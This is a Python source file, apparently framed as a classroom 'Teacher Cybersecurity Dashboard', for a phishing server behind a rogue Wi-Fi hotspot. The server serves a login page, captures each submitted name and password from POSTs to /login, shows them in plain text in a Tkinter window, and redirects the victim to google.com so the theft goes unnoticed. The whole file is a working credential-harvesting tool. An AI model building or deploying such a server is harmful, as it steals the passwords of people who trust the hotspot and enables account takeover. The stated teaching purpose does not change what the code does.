import http.server
import socketserver
import urllib.parse
import threading
import tkinter as tk
from tkinter import ttk
import os

PORT = 8080

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

class GuidedServerHandler(http.server.SimpleHTTPRequestHandler):
    
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html_path = os.path.join(BASE_DIR, 'index.html')
            
            try:
                with open(html_path, 'rb') as file:
                    self.wfile.write(file.read())
            except FileNotFoundError:
                error_msg = f"<h1>404 File Not Found</h1><p>Ensure index.html is sitting inside the folder: {BASE_DIR}</p>"
                self.wfile.write(error_msg.encode('utf-8'))
        else:
            super().do_GET()

    def do_POST(self):
        if self.path == '/login':
            header_length = int(self.headers['Content-Length'])
            raw_body_bytes = self.rfile.read(header_length)
            decoded_text = raw_body_bytes.decode('utf-8')
            
            parsed_variables = urllib.parse.parse_qs(decoded_text)
            
            student_name = parsed_variables.get('firstname', ['Unknown'])
            captured_password = parsed_variables.get('password', ['Unknown'])
            
            root.after(0, app.update_dashboard, student_name, captured_password)
            
            self.send_response(302)
            self.send_header('Location', 'https://google.com')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

class TeacherDashboardApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Teacher Cybersecurity Dashboard")
        self.root.geometry("550x520")
        
        self.main_frame = ttk.Frame(root, padding="20 20 20 20")
        self.main_frame.pack(fill=tk.BOTH, expand=True)

        self.title_label = ttk.Label(self.main_frame, text="Rogue Hotspot Traffic Monitor", font=("Arial", 16, "bold"))
        self.title_label.pack(pady=10)

        self.status_label = ttk.Label(self.main_frame, text=f"Network Engine Active • Listening on Port {PORT}", font=("Arial", 10, "italic"))
        self.status_label.pack(pady=5)

        self.log_display = tk.Text(self.main_frame, width=60, height=18, font=("Courier", 11), bg="#2d3436", fg="#00ff00", bd=1, padx=10, pady=10)
        self.log_display.pack(pady=15, fill=tk.BOTH, expand=True)
        self.log_display.insert(tk.END, f"[SYSTEM] Root folder: {BASE_DIR}\n")
        self.log_display.insert(tk.END, "[SYSTEM] Awaiting incoming data payloads...\n")
        self.log_display.config(state=tk.DISABLED)

        self.clear_button = ttk.Button(self.main_frame, text="Clear Dashboard Logs", command=self.clear_logs)
        self.clear_button.pack(pady=5)

    def update_dashboard(self, name, password):
        formatted_entry = f"\n[!] INCOMING NETWORK ALERT\n[+] User Identity: {name}\n[+] Raw Password : {password}\n" + "-"*42 + "\n"
        
        self.log_display.config(state=tk.NORMAL)
        self.log_display.insert(tk.END, formatted_entry)
        self.log_display.see(tk.END) 
        self.log_display.config(state=tk.DISABLED)

    def clear_logs(self):
        self.log_display.config(state=tk.NORMAL)
        self.log_display.delete("1.0", tk.END)
        self.log_display.insert(tk.END, "[SYSTEM] Logs cleared. Awaiting new data packages...\n")
        self.log_display.config(state=tk.DISABLED)

def run_network_server():
    socketserver.TCPServer.allow_reuse_address = True
    try:
        with socketserver.TCPServer(("", PORT), GuidedServerHandler) as httpd:
            httpd.serve_forever()
    except Exception as e:
        print(f"[!] Server error: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = TeacherDashboardApp(root)

    server_thread = threading.Thread(target=run_network_server, daemon=True)
    server_thread.start()

    root.mainloop()


